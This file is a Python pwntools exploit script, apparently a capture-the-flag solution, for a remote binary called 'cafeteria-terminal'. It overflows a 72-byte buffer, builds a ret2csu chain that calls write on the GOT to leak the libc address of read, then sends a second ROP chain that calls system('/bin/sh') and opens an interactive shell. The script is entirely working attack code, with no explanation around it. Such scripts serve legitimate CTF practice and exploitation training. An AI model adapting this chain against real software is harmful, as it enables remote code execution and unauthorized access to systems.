#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("cafeteria-terminal")
libc = ELF("libc-2.31.so")

OFFSET = 72

POP_RDI_RET = 0x4011FA
RET = 0x40120F
CSU_CALL = 0x401490
CSU_POP = 0x4014AA

def build_csu_call(func_ptr, arg1, arg2, arg3, ret_addr):
    return flat(
        CSU_POP,
        0,
        1,
        arg1,
        arg2,
        arg3,
        func_ptr,
        CSU_CALL,
        0,
        0, 0, 0, 0, 0, 0,
        ret_addr,
    )


io = remote("chal.thuctf.redbud.info", 34991)

io.recvuntil(b"Do you want to check the live pickup queue screen? (y/n)")
io.recvuntil(b"> ")
io.sendline(b"n")
io.recvuntil(b"Enter a short note for the advance pickup printer.")
io.recvuntil(b"> ")

payload1 = b"A" * OFFSET
payload1 += build_csu_call(
    elf.got["write"],
    1,
    elf.got["read"],
    8,
    elf.sym["main"],
)
io.send(payload1)

io.recvuntil(b"A message appears: 'Please wait for staff approval.'\n")
read_leak = u64(io.recvn(8))
libc.address = read_leak - libc.sym["read"]
log.success(f"read@libc: {hex(read_leak)}")
log.success(f"libc base: {hex(libc.address)}")

io.recvuntil(b"Do you want to check the live pickup queue screen? (y/n)")
io.recvuntil(b"> ")
io.sendline(b"n")
io.recvuntil(b"Enter a short note for the advance pickup printer.")
io.recvuntil(b"> ")

binsh = next(libc.search(b"/bin/sh\x00"))
payload2 = flat(
    b"A" * OFFSET,
    RET,
    POP_RDI_RET,
    binsh,
    libc.sym["system"],
    libc.sym["exit"],
)
io.send(payload2)

io.interactive()